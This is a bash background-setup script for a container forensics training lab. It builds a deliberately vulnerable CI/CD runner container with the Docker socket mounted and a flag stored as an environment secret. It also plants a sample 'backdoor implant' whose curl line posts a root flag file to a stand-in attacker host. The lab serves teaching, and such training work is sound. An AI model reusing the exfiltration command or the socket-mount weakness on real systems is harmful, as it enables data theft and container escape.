#!/bin/bash
# ==============================================================================
# Killercoda Background Setup Script
# DevSecOps & Container DFIR Workshop - CPIFP Alan Turing
# ==============================================================================

exec > /var/log/killercoda_background.log 2>&1
set -x

# Remove any stale markers and residual flags
rm -f /tmp/killercoda_ready /tmp/killercoda_failed /root/host_flag.txt /root/.host_flag.txt /root/flag*.txt /tmp/flag*.txt 2>/dev/null || true

# Error handling trap
cleanup_trap() {
    EXIT_CODE=$?
    if [ "${EXIT_CODE}" -ne 0 ]; then
        echo "[ERROR] background.sh failed with exit code ${EXIT_CODE} at line ${BASH_LINENO[0]}!"
        touch /tmp/killercoda_failed
    fi
}
trap cleanup_trap EXIT ERR

echo "[$(date '+%Y-%m-%d %I:%M:%S %p')] [INIT] Starting Killercoda background setup..."

# 1. Ensure Docker daemon is active and responsive
echo "[INIT] Verifying Docker daemon readiness..."
systemctl start docker || service docker start || true

DOCKER_RETRIES=40
until docker info >/dev/null 2>&1 || [ ${DOCKER_RETRIES} -le 0 ]; do
    echo "[DOCKER] Awaiting Docker daemon responsiveness (${DOCKER_RETRIES} attempts remaining)..."
    sleep 1
    DOCKER_RETRIES=$((DOCKER_RETRIES - 1))
done

if ! docker info >/dev/null 2>&1; then
    echo "[FATAL] Docker daemon is unreachable after timeout."
    exit 1
fi

# Ensure both 'docker compose' and 'docker-compose' work seamlessly
mkdir -p /usr/local/lib/docker/cli-plugins /usr/libexec/docker/cli-plugins
if command -v docker-compose >/dev/null 2>&1 && ! docker compose version >/dev/null 2>&1; then
    echo "[COMPOSE] Creating CLI plugin bridge for docker compose..."
    cat << 'EOF' > /usr/local/lib/docker/cli-plugins/docker-compose
#!/bin/bash
if [ "$1" = "docker-cli-plugin-metadata" ]; then
    echo '{"SchemaVersion":"0.1.0","Vendor":"Docker","Version":"v2"}'
    exit 0
fi
exec docker-compose "$@"
EOF
    chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
    cp -f /usr/local/lib/docker/cli-plugins/docker-compose /usr/libexec/docker/cli-plugins/docker-compose 2>/dev/null || true
fi

# 2. Update package repositories and install required tools non-interactively
echo "[APT] Installing YARA and jq..."
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y --no-install-recommends yara jq

# 3. Provision Dynamic Cryptographic Flags for Challenges 1 & 2
echo "[FLAG] Generating unique cryptographic challenge flags..."
FLAG1_HEX=$(openssl rand -hex 6 2>/dev/null || head -c 6 /dev/urandom | xxd -p 2>/dev/null || echo "a1b2c3d4e5f6")
FLAG2_HEX=$(openssl rand -hex 6 2>/dev/null || head -c 6 /dev/urandom | xxd -p 2>/dev/null || echo "f6e5d4c3b2a1")

DYNAMIC_FLAG1="FLAG{proc_harvest_${FLAG1_HEX}}"
DYNAMIC_FLAG2="FLAG{dckr_sock_breakout_${FLAG2_HEX}}"

# Save flag 2 as a hidden dotfile on host so it does not clutter terminal or spoil on 'ls'
echo "${DYNAMIC_FLAG2}" > /root/.host_flag.txt
chmod 600 /root/.host_flag.txt
rm -f /root/host_flag.txt

# 4. Synchronize assets and evidence directories
echo "[ASSETS] Preparing scenario paths..."
mkdir -p /assets/victim /assets/evidence /evidence /root/assets

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Copy from scenario assets directory if present
if [ -d "${SCRIPT_DIR}/assets" ]; then
    cp -ru "${SCRIPT_DIR}/assets/"* /assets/ 2>/dev/null || true
fi

# Copy from /root/assets if Killercoda placed assets there
if [ -d "/root/assets" ] && [ "$(ls -A /root/assets 2>/dev/null)" ]; then
    cp -ru /root/assets/* /assets/ 2>/dev/null || true
fi

# Fallback: Generate victim pipeline runner if missing
if [ ! -f "/assets/victim/pipeline_runner.sh" ]; then
    echo "[FALLBACK] Generating pipeline_runner.sh..."
    cat << 'EOF' > /assets/victim/pipeline_runner.sh
#!/bin/sh
echo "========================================================"
echo "[CI/CD Pipeline Daemon] Initializing worker agent..."
echo "[CI/CD Pipeline Daemon] Worker ID: runner-prod-eu-west-01"
echo "[CI/CD Pipeline Daemon] Organization: CPIFP Alan Turing"
echo "[CI/CD Pipeline Daemon] PID: $$"
echo "========================================================"
trap "echo '[CI/CD Daemon] Received shutdown signal. Terminating.'; exit 0" SIGINT SIGTERM
echo "[CI/CD Pipeline Daemon] Worker agent initialized. Listening for jobs..."
while true; do
    echo "[$(date '+%Y-%m-%d %I:%M:%S %p')] [CI/CD Worker] Queue status: IDLE. Ready for webhook triggers."
    sleep 15
done
EOF
fi
chmod 755 /assets/victim/pipeline_runner.sh

# Fallback: Generate Dockerfile if missing
if [ ! -f "/assets/victim/Dockerfile" ]; then
    echo "[FALLBACK] Generating victim Dockerfile..."
    cat << 'EOF' > /assets/victim/Dockerfile
FROM alpine:3.19
RUN apk update && \
    apk add --no-cache docker-cli bash curl procps coreutils binutils
WORKDIR /app
COPY pipeline_runner.sh /app/pipeline_runner.sh
RUN chmod 755 /app/pipeline_runner.sh
RUN addgroup -g 10001 -S cicdgroup && \
    adduser -u 10001 -S cicduser -G cicdgroup
ENTRYPOINT ["/bin/sh", "-c", "DEPLOY_PRODUCTION_KEY='FLAG{DYNAMIC_RUNTIME_SECRET}' exec /app/pipeline_runner.sh"]
EOF
fi

# Inject dynamic runtime flag into victim Dockerfile before building (across all search paths)
for df in \
    "/assets/victim/Dockerfile" \
    "/root/assets/victim/Dockerfile" \
    "${SCRIPT_DIR}/victim/Dockerfile" \
    "${SCRIPT_DIR}/assets/victim/Dockerfile"; do
    if [ -f "${df}" ]; then
        sed -i "s|\\\${DYNAMIC_FLAG1}|${DYNAMIC_FLAG1}|g" "${df}"
        sed -i "s|\${DYNAMIC_FLAG1}|${DYNAMIC_FLAG1}|g" "${df}"
        sed -i "s|FLAG{DYNAMIC_RUNTIME_SECRET}|${DYNAMIC_FLAG1}|g" "${df}"
        sed -i "s|FLAG{supply_chain_credential_leaked_proc_2026}|${DYNAMIC_FLAG1}|g" "${df}"
    fi
done

# Fallback: Generate docker-compose.yml if missing
if [ ! -f "/assets/docker-compose.yml" ]; then
    echo "[FALLBACK] Generating docker-compose.yml..."
    cat << 'EOF' > /assets/docker-compose.yml
version: '3.8'

services:
  cicd_runner_pipeline:
    container_name: cicd_runner_pipeline
    image: alan-turing/cicd-runner:vulnerable
    build:
      context: ./victim
      dockerfile: Dockerfile
    restart: unless-stopped
    environment:
      - RUNNER_NAME=worker-01
      - RUNNER_ORGANIZATION=AlanTuring-SecOps
      - CI_ENVIRONMENT=production
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
EOF
fi

# Fallback: Generate backdoor implant if missing
if [ ! -f "/evidence/backdoor_implant.sh" ]; then
    if [ -f "/assets/evidence/backdoor_implant.sh" ]; then
        cp /assets/evidence/backdoor_implant.sh /evidence/backdoor_implant.sh
    else
        echo "[FALLBACK] Generating backdoor_implant.sh..."
        cat << 'EOF' > /evidence/backdoor_implant.sh
#!/bin/sh
# Malicious Exfiltration Hook
curl -X POST -d @/root/.host_flag.txt http://evil-c2.attacker.internal/exfil
EOF
    fi
fi
chmod 755 /evidence/backdoor_implant.sh
cp -u /evidence/backdoor_implant.sh /assets/evidence/backdoor_implant.sh 2>/dev/null || true

# Symlink /root/assets and /assets for consistent resolution
ln -sfn /assets /root/assets 2>/dev/null || true

# Synchronize verification scripts to /step1/, /step2/, /step3/, /step4/
for i in 1 2 3 4; do
    mkdir -p "/step${i}"
    if [ -f "${SCRIPT_DIR}/step${i}/verify.sh" ]; then
        cp "${SCRIPT_DIR}/step${i}/verify.sh" "/step${i}/verify.sh"
    elif [ -f "/assets/step${i}/verify.sh" ]; then
        cp "/assets/step${i}/verify.sh" "/step${i}/verify.sh"
    fi
    chmod +x "/step${i}/verify.sh" 2>/dev/null || true
done

# Install scoring and tactical hint utilities into system PATH
mkdir -p /assets/scoring /usr/local/bin
for src in \
    "${SCRIPT_DIR}/scoring" \
    "${SCRIPT_DIR}/assets/scoring" \
    "/scoring" \
    "/assets/scoring" \
    "/root/assets/scoring"; do
    if [ -d "${src}" ] && [ -f "${src}/score_client.sh" ]; then
        cp -ru "${src}/"* /assets/scoring/ 2>/dev/null || true
        break
    fi
done

# If scoring files are still missing, fetch directly from raw repository
if [ ! -f "/assets/scoring/score_client.sh" ]; then
    echo "[RECOVERY] Fetching scoring suite from repository..."
    curl -sSf https://raw.githubusercontent.com/RickyAllitt/Taller-Alan-Turing/master/devsecops-dfir-part1/assets/scoring/config.env -o /assets/scoring/config.env 2>/dev/null || true
    curl -sSf https://raw.githubusercontent.com/RickyAllitt/Taller-Alan-Turing/master/devsecops-dfir-part1/assets/scoring/score_client.sh -o /assets/scoring/score_client.sh 2>/dev/null || true
    curl -sSf https://raw.githubusercontent.com/RickyAllitt/Taller-Alan-Turing/master/devsecops-dfir-part1/assets/scoring/hint.sh -o /assets/scoring/hint.sh 2>/dev/null || true
    chmod 755 /assets/scoring/score_client.sh /assets/scoring/hint.sh 2>/dev/null || true
fi

for candidate in "/assets/scoring/score_client.sh" "${SCRIPT_DIR}/scoring/score_client.sh" "${SCRIPT_DIR}/assets/scoring/score_client.sh"; do
    if [ -f "${candidate}" ]; then
        cp "${candidate}" /usr/local/bin/score_client.sh
        cp "${candidate}" /usr/local/bin/score
        chmod 755 /usr/local/bin/score_client.sh /usr/local/bin/score
        break
    fi
done

for candidate in "/assets/scoring/hint.sh" "${SCRIPT_DIR}/scoring/hint.sh" "${SCRIPT_DIR}/assets/scoring/hint.sh"; do
    if [ -f "${candidate}" ]; then
        cp "${candidate}" /usr/local/bin/hint
        chmod 755 /usr/local/bin/hint
        break
    fi
done

# 5. Pre-pull alpine image to accelerate Challenge 2 breakout
echo "[DOCKER] Pre-pulling alpine image..."
docker pull alpine:3.19 || docker pull alpine:latest || true

# 6. Build victim container image
echo "[DOCKER] Building CI/CD runner victim image..."
docker build -t alan-turing/cicd-runner:vulnerable /assets/victim

# 7. Launch vulnerable container infrastructure
echo "[COMPOSE] Starting container stack..."
if docker compose version >/dev/null 2>&1; then
    docker compose -f /assets/docker-compose.yml up -d
else
    docker-compose -f /assets/docker-compose.yml up -d
fi

# 8. Wait for container to be ready
echo "[WAIT] Waiting for cicd_runner_pipeline container..."
MAX_RETRIES=30
COUNT=0
until [ "$(docker inspect -f '{{.State.Running}}' cicd_runner_pipeline 2>/dev/null)" = "true" ]; do
    sleep 1
    COUNT=$((COUNT + 1))
    if [ "${COUNT}" -ge "${MAX_RETRIES}" ]; then
        echo "[FATAL] Timeout waiting for cicd_runner_pipeline to start."
        exit 1
    fi
done

# 9. Inject forensic artifact into container's writable overlay layer
echo "[DFIR] Injecting forensic implant into container..."
docker exec cicd_runner_pipeline mkdir -p /var/log/pipeline_audit/
docker cp /evidence/backdoor_implant.sh cicd_runner_pipeline:/var/log/pipeline_audit/backdoor_implant.sh
docker exec cicd_runner_pipeline chmod 755 /var/log/pipeline_audit/backdoor_implant.sh

# 10. Drop completion marker for foreground script
echo "[READY] Background provisioning completed successfully."
touch /tmp/killercoda_ready
